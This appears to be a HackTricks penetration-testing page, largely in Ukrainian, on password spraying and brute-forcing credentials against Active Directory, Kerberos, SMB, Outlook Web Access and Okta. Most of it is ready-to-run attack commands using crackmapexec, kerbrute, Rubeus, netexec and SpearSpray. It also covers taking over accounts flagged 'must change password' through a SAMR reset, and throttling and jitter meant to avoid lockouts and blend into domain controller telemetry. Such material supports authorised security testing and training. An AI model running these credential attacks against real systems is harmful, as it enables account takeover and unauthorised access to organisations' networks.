# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Після того, як ви знайшли кілька **valid usernames**, ви можете спробувати найпоширеніші **common passwords** (беріть до уваги **password policy** середовища).\
За замовчуванням мінімальна довжина **password** — **7**.

Списки поширених **usernames** також можуть бути корисними: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Зверніть увагу, що ви **could lockout some accounts if you try several wrong passwords** (за замовчуванням більше 10).

### Get password policy

Якщо у вас є якісь **user credentials** або shell як **domain user**, ви можете **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Експлуатація з Linux (або з будь-якої ОС)

- Використовуючи **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Використання [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(ви можете вказати кількість спроб, щоб уникнути блокувань):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Використання [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - НЕ РЕКОМЕНДУЄТЬСЯ — ІНОДІ НЕ ПРАЦЮЄ
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- За допомогою модуля `scanner/smb/smb_login` з **Metasploit**:

![](<../../images/image (745).png>)

- Використовуючи **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### З Windows

- З версією [Rubeus](https://github.com/Zer1t0/Rubeus) з модулем brute:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- За допомогою [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (може за замовчуванням генерувати користувачів із домену, отримувати політику паролів із домену та обмежувати кількість спроб відповідно до неї):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- За допомогою [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Виявлення та захоплення облікових записів "Password must change at next logon" (SAMR)

Низькошумний метод — spray a benign/empty password і виявляти облікові записи, які повертають STATUS_PASSWORD_MUST_CHANGE, що вказує, що password було примусово прострочено і його можна змінити без знання старого.

Порядок:
- Перелічити користувачів (RID brute via SAMR) щоб скласти список цілей:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray порожній пароль і продовжуйте при hits, щоб захопити облікові записи, які повинні змінити пароль при наступному logon:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Для кожного hit, змініть пароль через SAMR за допомогою NetExec’s module (старий пароль не потрібен, коли встановлено "must change"):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Оперативні нотатки:
- Переконайтеся, що годинник вашого хоста синхронізовано з DC перед Kerberos-based операціями: `sudo ntpdate <dc_fqdn>`.
- Позначка [+] без (Pwn3d!) у деяких модулях (наприклад, RDP/WinRM) означає, що creds дійсні, але обліковий запис не має interactive logon rights.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying з LDAP targeting та PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying зменшує шум у порівнянні з SMB/NTLM/LDAP bind attempts і краще узгоджується з AD lockout policies. SpearSpray поєднує LDAP-driven targeting, pattern engine і policy awareness (domain policy + PSOs + badPwdCount buffer), щоб здійснювати spray точно і безпечно. Він також може тегувати скомпрометовані principals у Neo4j для BloodHound pathing.

Ключові ідеї:
- LDAP user discovery з пагінацією та підтримкою LDAPS, опційно використовуючи custom LDAP filters.
- Domain lockout policy + PSO-aware filtering, щоб залишити налаштовуваний буфер спроб (threshold) і уникнути блокування користувачів.
- Kerberos pre-auth validation із використанням швидких gssapi bindings (генерує 4768/4771 на DCs замість 4625).
- Pattern-based, per-user password generation з використанням змінних, таких як імена та часові значення, похідні від кожного користувача's pwdLastSet.
- Контроль пропускної здатності за допомогою threads, jitter і max requests per second.
- Опційна інтеграція з Neo4j для маркування owned users для BloodHound.

Базове використання та виявлення:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Вибір цілей та контроль шаблонів:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Заходи прихованості та безпеки:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound збагачення:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Огляд системи шаблонів (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Доступні змінні включають:
- {name}, {samaccountname}
- Тимчасові значення з pwdLastSet кожного користувача (або whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Допоміжні елементи для складання та токен організації: {separator}, {suffix}, {extra}

Операційні нотатки:
- Надавайте перевагу запитам до PDC-emulator з -dc, щоб читати найавторитетніший badPwdCount та інформацію, пов’язану з політикою.
- Скидання badPwdCount тригеряться при наступній спробі після вікна спостереження; використовуйтесь порогові значення і таймінг, щоб залишатися в безпеці.
- Спроби Kerberos pre-auth відображаються як 4768/4771 у DC telemetry; використовуйте jitter і rate-limiting, щоб злитися з фоном.

> Порада: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

Є кілька інструментів для p**assword spraying outlook**.

- За допомогою [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- за допомогою [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- За допомогою [Ruler](https://github.com/sensepost/ruler) (надійний!)
- За допомогою [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- За допомогою [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Щоб використовувати будь-який із цих інструментів, потрібні список користувачів і пароль або невеликий список паролів для password spraying.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Посилання

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
